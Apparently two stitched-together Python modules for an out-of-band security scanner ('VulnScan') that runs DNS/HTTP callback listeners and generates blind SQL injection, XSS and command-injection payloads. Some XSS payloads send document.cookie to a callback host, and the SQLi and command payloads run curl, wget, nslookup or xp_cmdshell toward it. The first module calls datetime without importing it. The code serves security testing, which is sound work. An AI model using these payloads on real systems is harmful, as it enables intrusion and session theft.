import time
import uuid
import threading
import socket
import socketserver
import http.server
from collections import defaultdict

class VulnScanCollaborator:
    """
    OAST (Out-of-Band Application Security Testing) Collaborator for VulnScan
    Detects blind vulnerabilities by monitoring DNS/HTTP callbacks from target servers
    """
    def __init__(self, domain="VulnScan-collaborator.local", dns_port=5353, http_port=8080, verbose=False):
        self.domain = domain
        self.dns_port = dns_port
        self.http_port = http_port
        self.verbose = verbose
        self.active_payloads = {}
        self.detected_callbacks = []
        self.dns_server = None
        self.http_server = None
        self.servers_running = False
        self.stats = {
            'payloads_generated': 0,
            'dns_callbacks': 0,
            'http_callbacks': 0,
            'vulnerabilities_detected': 0
        }

    def log(self, msg):
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[OAST {timestamp}] {msg}")

    def start(self):
        return self.start_collaborator_servers()

    def stop(self):
        return self.stop_collaborator_servers()

    def get_stats(self):
        return {
            'total_callbacks': self.stats['dns_callbacks'] + self.stats['http_callbacks'],
            'dns_callbacks': self.stats['dns_callbacks'],
            'http_callbacks': self.stats['http_callbacks'],
            'payloads_generated': self.stats['payloads_generated'],
            'vulnerabilities_detected': self.stats['vulnerabilities_detected']
        }

    def start_collaborator_servers(self):
        if self.servers_running:
            return True
        dns_port = self._find_available_port(self.dns_port)
        http_port = self._find_available_port(self.http_port)
        if dns_port != self.dns_port:
            self.log(f"DNS port {self.dns_port} busy, using {dns_port}")
            self.dns_port = dns_port
        if http_port != self.http_port:
            self.log(f"HTTP port {self.http_port} busy, using {http_port}")
            self.http_port = http_port
        try:
            self.dns_server = CollaboratorDNSServer(
                self.domain,
                self.dns_port,
                self.on_dns_callback,
                self.verbose
            )
            dns_thread = threading.Thread(target=self.dns_server.start, daemon=True)
            dns_thread.start()
            self.http_server = CollaboratorHTTPServer(
                self.http_port,
                self.on_http_callback,
                self.verbose
            )
            http_thread = threading.Thread(target=self.http_server.start, daemon=True)
            http_thread.start()
            time.sleep(1)
            self.servers_running = True
            self.log(f"Collaborator servers started - DNS:{self.dns_port}, HTTP:{self.http_port}")
            return True
        except Exception as e:
            self.log(f"Failed to start collaborator servers: {e}")
            return False

    def _find_available_port(self, start_port):
        for port in range(start_port, start_port + 100):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('localhost', port))
                    return port
            except OSError:
                continue
        return start_port

    def stop_collaborator_servers(self):
        if self.dns_server:
            self.dns_server.stop()
        if self.http_server:
            self.http_server.stop()
        self.servers_running = False
        self.log("Collaborator servers stopped")

    def generate_sqli_payloads(self):
        payloads = []
        db_types = ['mssql', 'mysql', 'postgresql', 'oracle']
        for db_type in db_types:
            unique_id = str(uuid.uuid4())[:8]
            subdomain = f"{unique_id}.sqli.{db_type}"
            if db_type == 'mssql':
                payload = f"'; EXEC xp_cmdshell('nslookup {subdomain}.{self.domain}'); --"
            elif db_type == 'mysql':
                payload = f"'; SELECT load_file(CONCAT('http://{subdomain}.{self.domain}/')); --"
            elif db_type == 'postgresql':
                payload = f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}.{self.domain}'; --"
            elif db_type == 'oracle':
                payload = f"' UNION SELECT utl_http.request('http://{subdomain}.{self.domain}/') FROM dual; --"
            payload_info = {
                'payload': payload,
                'callback_id': unique_id,
                'db_type': db_type,
                'subdomain': f"{subdomain}.{self.domain}",
                'timestamp': time.time(),
                'detected': False
            }
            self.active_payloads[unique_id] = payload_info
            payloads.append(payload_info)
            self.stats['payloads_generated'] += 1
        return payloads

    def generate_xss_payloads(self):
        payloads = []
        contexts = ['script', 'img', 'iframe', 'form']
        for context in contexts:
            unique_id = str(uuid.uuid4())[:8]
            subdomain = f"{unique_id}.xss.{context}"
            if context == 'script':
                payload = f"<script>fetch('http://{subdomain}.{self.domain}/')</script>"
            elif context == 'img':
                payload = f"<img src='http://{subdomain}.{self.domain}/' onerror='this.src=\"http://{subdomain}.{self.domain}/error\"'>"
            elif context == 'iframe':
                payload = f"<iframe src='http://{subdomain}.{self.domain}/'></iframe>"
            elif context == 'form':
                payload = f"<form action='http://{subdomain}.{self.domain}/' method='post'><input type='submit'></form>"
            payload_info = {
                'payload': payload,
                'callback_id': unique_id,
                'context': context,
                'subdomain': f"{subdomain}.{self.domain}",
                'timestamp': time.time(),
                'detected': False
            }
            self.active_payloads[unique_id] = payload_info
            payloads.append(payload_info)
            self.stats['payloads_generated'] += 1
        return payloads

    def check_callback(self, callback_id):
        if callback_id in self.active_payloads:
            return self.active_payloads[callback_id]['detected']
        return False

    def on_dns_callback(self, query_name, client_ip):
        self.stats['dns_callbacks'] += 1
        self.log(f"DNS callback received: {query_name} from {client_ip}")
        parts = query_name.split('.')
        if len(parts) >= 3:
            payload_id = parts[0]
            vuln_type = parts[1] if len(parts) > 1 else 'unknown'
            if payload_id in self.active_payloads:
                self._mark_vulnerability_detected(payload_id, 'dns', {
                    'query': query_name,
                    'client_ip': client_ip,
                    'callback_type': 'DNS'
                })

    def on_http_callback(self, path, client_ip, headers, method):
        self.stats['http_callbacks'] += 1
        self.log(f"HTTP callback received: {method} {path} from {client_ip}")
        host = headers.get('Host', '')
        if host:
            parts = host.split('.')
            if len(parts) >= 2:
                payload_id = parts[0]
                if payload_id in self.active_payloads:
                    self._mark_vulnerability_detected(payload_id, 'http', {
                        'path': path,
                        'client_ip': client_ip,
                        'method': method,
                        'headers': dict(headers),
                        'callback_type': 'HTTP'
                    })

    def _mark_vulnerability_detected(self, payload_id, callback_type, callback_data):
        if payload_id in self.active_payloads:
            payload_info = self.active_payloads[payload_id]
            if not payload_info.get('detected', False):
                payload_info['detected'] = True
                payload_info['callback_data'] = callback_data
                payload_info['detection_time'] = time.time()
                self.detected_callbacks.append({
                    'payload_id': payload_id,
                    'payload_info': payload_info,
                    'callback_type': callback_type,
                    'callback_data': callback_data,
                    'timestamp': time.time()
                })
                self.stats['vulnerabilities_detected'] += 1
                vuln_type = payload_info.get('vulnerability_type', 'Unknown')
                url = payload_info.get('url', 'Unknown')
                param = payload_info.get('parameter', 'Unknown')
                self.log(f"🚨 VULNERABILITY DETECTED! {vuln_type.upper()} via {callback_type}")
                self.log(f"   Payload ID: {payload_id}")
                self.log(f"   Details: {callback_data}")

    def get_detected_vulnerabilities(self):
        return self.detected_callbacks.copy()

class CollaboratorDNSServer:
    def __init__(self, domain, port, callback_handler, verbose=False):
        self.domain = domain
        self.port = port
        self.callback_handler = callback_handler
        self.verbose = verbose
        self.running = False
        self.socket = None
    def start(self):
        self.running = True
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            self.socket.bind(('0.0.0.0', self.port))
            if self.verbose:
                print(f"[OAST] DNS server listening on port {self.port}")
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(512)
                    self._handle_dns_query(data, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        if self.verbose:
                            print(f"[OAST] DNS server error: {e}")
        except Exception as e:
            if self.verbose:
                print(f"[OAST] Failed to start DNS server: {e}")
        finally:
            if self.socket:
                self.socket.close()
    def _handle_dns_query(self, data, addr):
        try:
            if len(data) > 12:
                offset = 12
                domain_parts = []
                while offset < len(data):
                    length = data[offset]
                    if length == 0:
                        break
                    offset += 1
                    if offset + length <= len(data):
                        domain_parts.append(data[offset:offset + length].decode('utf-8', errors='ignore'))
                        offset += length
                    else:
                        break
                if domain_parts:
                    query_domain = '.'.join(domain_parts)
                    if self.domain in query_domain:
                        self.callback_handler(query_domain, addr[0])
        except Exception as e:
            if self.verbose:
                print(f"[OAST] DNS query parsing error: {e}")
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()

class CollaboratorHTTPServer:
    def __init__(self, port, callback_handler, verbose=False):
        self.port = port
        self.callback_handler = callback_handler
        self.verbose = verbose
        self.server = None
    def start(self):
        handler = self._create_handler()
        self.server = http.server.HTTPServer(('0.0.0.0', self.port), handler)
        if self.verbose:
            print(f"[OAST] HTTP server listening on port {self.port}")
        try:
            self.server.serve_forever()
        except Exception as e:
            if self.verbose:
                print(f"[OAST] HTTP server error: {e}")
    def _create_handler(self):
        callback_handler = self.callback_handler
        verbose = self.verbose
        class CallbackHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self._handle_request()
            def do_POST(self):
                self._handle_request()
            def do_HEAD(self):
                self._handle_request()
            def _handle_request(self):
                client_ip = self.client_address[0]
                callback_handler(self.path, client_ip, self.headers, self.command)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'VulnScan Collaborator')
            def log_message(self, format, *args):
                if verbose:
                    super().log_message(format, *args)
        return CallbackHandler
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
"""
OAST (Out-of-Band Application Security Testing) Collaborator Service
Handles callback generation, monitoring, and management for blind vulnerability detection
"""

import uuid
import time
import asyncio
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import json
import aiohttp
from urllib.parse import urljoin


@dataclass
class OASTCallback:
    """Represents an OAST callback interaction"""
    id: str
    payload_id: str
    timestamp: datetime
    source_ip: str
    method: str
    headers: Dict[str, str]
    body: str
    url: str
    vulnerability_type: str
    scan_id: Optional[str] = None


@dataclass
class OASTPayload:
    """Represents an OAST payload for testing"""
    id: str
    payload: str
    callback_url: str
    vulnerability_type: str
    created_at: datetime
    expires_at: datetime
    scan_id: Optional[str] = None


class OASTCollaborator:
    """OAST Collaborator for detecting blind vulnerabilities via out-of-band channels"""
    
    def __init__(self, collaborator_url: str = None, auth_token: str = None):
        """
        Initialize OAST Collaborator
        
        Args:
            collaborator_url: Base URL for the collaborator server (e.g., Burp Collaborator)
            auth_token: Authentication token if required
        """
        # Allow environment variable override
        env_url = os.getenv("OAST_COLLABORATOR_URL")
        base_url = collaborator_url or env_url or "http://gkpxyaluuixskilirkuuqkzubj23rq5xm.oast.fun"
        # Normalize and store
        self.collaborator_url = base_url.rstrip('/')
        self.auth_token = auth_token or os.getenv("OAST_COLLABORATOR_TOKEN")
        # Storage for generated payloads and received callbacks (in-memory only for now)
        self.payloads = {}
        self.callbacks = {}
        self.session = None
            
    async def initialize(self):
        """Initialize the collaborator service"""
        self.session = aiohttp.ClientSession()
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
            
    def generate_callback_id(self) -> str:
        """Generate a unique callback identifier"""
        return str(uuid.uuid4()).replace('-', '')[:16]
        
    def generate_subdomain(self) -> str:
        """Generate a unique (sub)domain for OAST testing.

        If the base collaborator domain already looks like a pre-generated
        unique hostname (e.g. long random label + .oast.fun) we reuse it as-is
        so we don't prepend another random prefix which could break DNS.
        Otherwise we prepend a fresh random ID to spread callbacks per payload.
        """
        base = self.collaborator_url.replace('http://', '').replace('https://', '')
        first_label = base.split('.')[0]
        # Heuristic: if first label length > 25 assume already unique
        if len(first_label) > 25:
            return base
        return f"{self.generate_callback_id()}.{base}"
        
    def generate_xss_payloads(self, scan_id: str = None) -> List[Dict[str, Any]]:
        """Generate XSS OAST payloads for blind XSS detection"""
        payloads = []
        
        # JavaScript-based payloads
        js_templates = [
            '<script>fetch("http://{subdomain}/xss?data="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://{subdomain}/xss?location=\'+location.href)">',
            '<svg onload="fetch(\'http://{subdomain}/xss?dom=\'+document.documentElement.outerHTML.length)">',
            '"><script>new Image().src="http://{subdomain}/xss?cookie="+btoa(document.cookie)</script>',
            '\';fetch("http://{subdomain}/xss?ref="+document.referrer);//'
        ]
        
        for template in js_templates:
            callback_id = self.generate_callback_id()
            subdomain = self.generate_subdomain()
            payload_text = template.format(subdomain=subdomain)
            callback_url = f"http://{subdomain}/xss"
            
            payload = OASTPayload(
                id=callback_id,
                payload=payload_text,
                callback_url=callback_url,
                vulnerability_type="xss",
                created_at=datetime.now(),
                expires_at=datetime.now() + timedelta(hours=1),
                scan_id=scan_id
            )
            
            self.payloads[callback_id] = payload
            payloads.append({
                "callback_id": callback_id,
                "payload": payload_text,
                "callback_url": callback_url
            })
            
        return payloads
        
    def generate_sqli_payloads(self, scan_id: str = None) -> List[Dict[str, Any]]:
        """Generate SQL injection OAST payloads for blind SQLi detection"""
        payloads = []
        
        # Database-specific OAST payloads
        db_templates = {
            "mysql": [
                "' UNION SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',VERSION()))-- ",
                "'; SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',USER()))-- ",
            ],
            "postgresql": [
                "'; COPY (SELECT version()) TO PROGRAM 'curl http://{subdomain}/sqli?postgres=1'-- ",
                "' UNION SELECT NULL,NULL,version() INTO OUTFILE '/dev/null' LINES TERMINATED BY '\ncurl http://{subdomain}/sqli?postgres=version'-- ",
            ],
            "mssql": [
                "'; EXEC master..xp_dirtree '\\\\{subdomain}\\sqli\\mssql'-- ",
                "' UNION SELECT NULL,NULL,@@version,NULL INTO OUTFILE '\\\\{subdomain}\\sqli\\mssql'-- ",
            ],
            "oracle": [
                "' UNION SELECT UTL_HTTP.request('http://{subdomain}/sqli?oracle='||USER) FROM dual-- ",
                "'; SELECT UTL_INADDR.get_host_name('{subdomain}') FROM dual-- ",
            ]
        }
        
        for db_type, templates in db_templates.items():
            for template in templates:
                callback_id = self.generate_callback_id()
                subdomain = self.generate_subdomain()
                payload_text = template.format(subdomain=subdomain)
                callback_url = f"http://{subdomain}/sqli"
                
                payload = OASTPayload(
                    id=callback_id,
                    payload=payload_text,
                    callback_url=callback_url,
                    vulnerability_type="sqli",
                    created_at=datetime.now(),
                    expires_at=datetime.now() + timedelta(hours=1),
                    scan_id=scan_id
                )
                
                self.payloads[callback_id] = payload
                payloads.append({
                    "callback_id": callback_id,
                    "payload": payload_text,
                    "callback_url": callback_url,
                    "db_type": db_type
                })
                
        return payloads
        
    def generate_command_injection_payloads(self, scan_id: str = None) -> List[Dict[str, Any]]:
        """Generate command injection OAST payloads"""
        payloads = []
        
        # OS-specific command injection payloads
        cmd_templates = [
            # Unix/Linux
            "; curl http://{subdomain}/cmd?os=unix",
            "| wget -qO- http://{subdomain}/cmd?os=linux",
            "`nslookup {subdomain}`",
            "$(dig {subdomain})",
            
            # Windows
            "& nslookup {subdomain}",
            "| ping -n 1 {subdomain}",
            "; powershell Invoke-WebRequest http://{subdomain}/cmd?os=windows",
        ]
        
        for template in cmd_templates:
            callback_id = self.generate_callback_id()
            subdomain = self.generate_subdomain()
            payload_text = template.format(subdomain=subdomain)
            callback_url = f"http://{subdomain}/cmd"
            
            payload = OASTPayload(
                id=callback_id,
                payload=payload_text,
                callback_url=callback_url,
                vulnerability_type="command_injection",
                created_at=datetime.now(),
                expires_at=datetime.now() + timedelta(hours=1),
                scan_id=scan_id
            )
            
            self.payloads[callback_id] = payload
            payloads.append({
                "callback_id": callback_id,
                "payload": payload_text,
                "callback_url": callback_url
            })
            
        return payloads
        
    async def register_callback(self, callback_data: Dict[str, Any]) -> bool:
        """Register a callback interaction"""
        try:
            callback = OASTCallback(
                id=str(uuid.uuid4()),
                payload_id=callback_data.get("payload_id", ""),
                timestamp=datetime.now(),
                source_ip=callback_data.get("source_ip", ""),
                method=callback_data.get("method", "GET"),
                headers=callback_data.get("headers", {}),
                body=callback_data.get("body", ""),
                url=callback_data.get("url", ""),
                vulnerability_type=callback_data.get("vulnerability_type", "unknown"),
                scan_id=callback_data.get("scan_id")
            )
            
            payload_id = callback.payload_id
            if payload_id not in self.callbacks:
                self.callbacks[payload_id] = []
            self.callbacks[payload_id].append(callback)
            
            return True
        except Exception as e:
            print(f"Error registering callback: {e}")
            return False
            
    def check_callback(self, payload_id: str) -> bool:
        """Check if a callback has been received for a specific payload"""
        return payload_id in self.callbacks and len(self.callbacks[payload_id]) > 0
        
    def get_callbacks(self, payload_id: str = None, scan_id: str = None) -> List[Dict[str, Any]]:
        """Get callbacks for a specific payload or scan"""
        result = []
        
        for pid, callbacks in self.callbacks.items():
            for callback in callbacks:
                if payload_id and pid != payload_id:
                    continue
                if scan_id and callback.scan_id != scan_id:
                    continue
                    
                result.append({
                    "id": callback.id,
                    "payload_id": callback.payload_id,
                    "timestamp": callback.timestamp.isoformat(),
                    "source_ip": callback.source_ip,
                    "method": callback.method,
                    "headers": callback.headers,
                    "body": callback.body,
                    "url": callback.url,
                    "vulnerability_type": callback.vulnerability_type,
                    "scan_id": callback.scan_id
                })
                
        return result
        
    def get_payloads(self, scan_id: str = None, vulnerability_type: str = None) -> List[Dict[str, Any]]:
        """Get generated payloads"""
        result = []
        
        for payload in self.payloads.values():
            if scan_id and payload.scan_id != scan_id:
                continue
            if vulnerability_type and payload.vulnerability_type != vulnerability_type:
                continue
                
            result.append({
                "id": payload.id,
                "payload": payload.payload,
                "callback_url": payload.callback_url,
                "vulnerability_type": payload.vulnerability_type,
                "created_at": payload.created_at.isoformat(),
                "expires_at": payload.expires_at.isoformat(),
                "scan_id": payload.scan_id,
                "has_callback": self.check_callback(payload.id)
            })
            
        return result
        
    def cleanup_expired_payloads(self):
        """Remove expired payloads and their callbacks"""
        now = datetime.now()
        expired_ids = [
            pid for pid, payload in self.payloads.items() 
            if payload.expires_at < now
        ]
        
        for pid in expired_ids:
            del self.payloads[pid]
            if pid in self.callbacks:
                del self.callbacks[pid]
                
        return len(expired_ids)
        
    def get_statistics(self) -> Dict[str, Any]:
        """Get OAST statistics"""
        total_payloads = len(self.payloads)
        total_callbacks = sum(len(callbacks) for callbacks in self.callbacks.values())
        active_payloads = sum(1 for p in self.payloads.values() if p.expires_at > datetime.now())
        
        vuln_types = {}
        for payload in self.payloads.values():
            vtype = payload.vulnerability_type
            if vtype not in vuln_types:
                vuln_types[vtype] = {"payloads": 0, "callbacks": 0}
            vuln_types[vtype]["payloads"] += 1
            vuln_types[vtype]["callbacks"] += len(self.callbacks.get(payload.id, []))
            
        return {
            "total_payloads": total_payloads,
            "active_payloads": active_payloads,
            "total_callbacks": total_callbacks,
            "vulnerability_types": vuln_types,
            "vulnerability_percentage": round((total_callbacks / total_payloads * 100) if total_payloads > 0 else 0, 2)
        }


# Global OAST collaborator instance
oast_collaborator = OASTCollaborator()
